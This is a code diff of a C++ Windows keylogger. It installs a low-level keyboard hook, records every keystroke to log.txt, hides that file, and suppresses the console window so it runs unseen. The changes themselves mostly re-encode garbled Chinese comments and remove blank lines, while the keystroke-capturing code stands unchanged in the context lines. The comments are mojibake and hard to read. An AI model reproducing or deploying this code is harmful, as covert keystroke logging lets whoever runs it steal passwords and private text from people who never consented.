@@ -1,5 +1,5 @@
 #define _WIN32_WINNT 0x0400
-#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")	
+#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")	//é€‚ç”¨äºVC++6.0æˆ–å…¶ä»–VSç¼–è¯‘å™¨
 #include <windows.h>
 #include <Winuser.h>
 #include <string>
@@ -93,13 +93,12 @@ string translate(int vkCode, int scanCode) {
 	return s;
 }
 
-
 LRESULT CALLBACK hookproc (int code, WPARAM wparam, LPARAM lparam) {
 	bool flag = false;
 	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lparam;
-	if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)	//¼ì²â¼üÅÌÊäÈë
+	if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)	//æ£€æµ‹é”®ç›˜è¾“å…¥
 		flag = true;
-	if (wparam == WM_KEYDOWN && p->vkCode == CAP) {		//¼ì²â¼üÅÌCapºÍShift×´Ì¬
+	if (wparam == WM_KEYDOWN && p->vkCode == CAP) {		//æ£€æµ‹é”®ç›˜Capå’ŒShiftçŠ¶æ€
 		cap = !cap;
 		openfile();
 		of << "[Caps Lock]";
@@ -110,7 +109,7 @@ LRESULT CALLBACK hookproc (int code, WPARAM wparam, LPARAM lparam) {
 		of << translate(p->vkCode, p->scanCode);
 		closefile();
 	}
-	::SetFileAttributes("log.txt", FILE_ATTRIBUTE_HIDDEN);	//Ôö¼ÓÒş²ØÎÄ¼şÊôĞÔ
+	::SetFileAttributes("log.txt", FILE_ATTRIBUTE_HIDDEN);	//å¢åŠ éšè—æ–‡ä»¶å±æ€§
 	return CallNextHookEx (hook, code, wparam, lparam);
  }
 
@@ -127,7 +126,6 @@ void sethook() {
 	if (hook == NULL)
 		exit(0);
 }
-
 
 int main()  {
 	sethook();
